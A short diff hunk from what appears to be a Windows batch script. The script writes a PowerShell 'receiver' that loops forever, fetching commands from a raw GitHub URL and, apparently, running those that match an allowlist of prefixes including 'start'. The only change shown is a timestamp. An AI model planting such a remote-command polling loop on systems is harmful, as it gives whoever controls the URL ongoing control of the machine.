@@ -8,7 +8,7 @@ set "PS_FILE=%~dp0\receiver_github_txt.ps1"
 > "%PS_FILE%" (
 echo $url = "%RAW_URL%"
 echo $allowedPrefixes = @("echo","start","dir","ping","hostname","notepad","calc")
-echo $lastExec = Get-Date "2000-01-01"
+echo $lastExec = Get-Date "2025-01-01"
 echo while ($true) {
 echo     try {
 echo         $cmd = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content.Trim()
